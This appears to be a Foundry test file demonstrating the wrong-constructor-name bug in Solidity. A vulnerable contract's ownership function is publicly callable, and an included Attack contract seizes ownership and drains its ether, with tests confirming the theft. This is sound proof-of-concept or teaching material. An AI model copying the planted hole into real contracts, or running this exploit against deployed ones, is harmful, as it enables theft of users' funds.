// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Import the vulnerable contracts. Adjust the import path as needed if the file resides elsewhere.

// Vulnerable contract with wrong constructor name
contract Missing {
    address payable private owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    // This function was intended to be a constructor but is publicly callable
    function Constructor() public {
        owner = payable(msg.sender);
    }

    receive() external payable {}

    function withdraw() public onlyOwner {
        owner.transfer(address(this).balance);
    }
}

// Attack contract to exploit the vulnerability
contract Attack {
    Missing public vulnerableContract;

    constructor(address payable _vulnerableAddress) {
        vulnerableContract = Missing(_vulnerableAddress);
    }

    // The attack: become the owner by calling Constructor() and then withdraw funds
    function attack() external {
        // Become the owner
        vulnerableContract.Constructor();
        // Drain funds
        vulnerableContract.withdraw();
    }

    // Receive Ether
    receive() external payable {}
}

contract MissingVulnerabilityTest is Test {
    Missing public missing;
    uint256 public constant FUND_AMOUNT = 10 ether;

    // Helper: use a different, non-precompile address for direct exploit
    address internal attacker = vm.addr(100);

    function setUp() public {
        // Deploy the vulnerable contract
        missing = new Missing();
        
        // Fund the vulnerable contract with 10 ether
        (bool success, ) = payable(address(missing)).call{value: FUND_AMOUNT}("");
        require(success, "Funding the contract failed");
    }

    // Test direct exploit by a non-precompile externally owned account
    function testDirectExploit() public {
        // Ensure attacker starts with 0 balance (adjust if necessary)
        vm.deal(attacker, 0);

        // Attacker calls the incorrectly named constructor to take ownership
        vm.prank(attacker);
        missing.Constructor();

        // Attacker then calls withdraw to drain funds
        vm.prank(attacker);
        missing.withdraw();

        // Verify that the attacker received the funds
        uint256 attackerBalance = attacker.balance;
        // Use assertGe to avoid potential minor differences in gas costs
        assertGe(attackerBalance, FUND_AMOUNT);
    }

    // Test exploit using the Attack contract
    function testAttackContractExploit() public {
        // Deploy the Attack contract with the address of the vulnerable contract
        Attack attackContract = new Attack(payable(address(missing)));

        // Check initial balance of the attack contract is zero
        assertEq(address(attackContract).balance, 0);

        // Call the attack function from an arbitrary EOA (here using vm.prank with a non-precompile address)
        address externalCaller = vm.addr(200);
        vm.prank(externalCaller);
        attackContract.attack();

        // After the attack, the vulnerable contract's balance should be zero
        assertEq(address(missing).balance, 0);

        // And the Attack contract should have received all the funds
        assertGe(address(attackContract).balance, FUND_AMOUNT);
    }

    // Allow the test contract to receive Ether
    receive() external payable {}
}
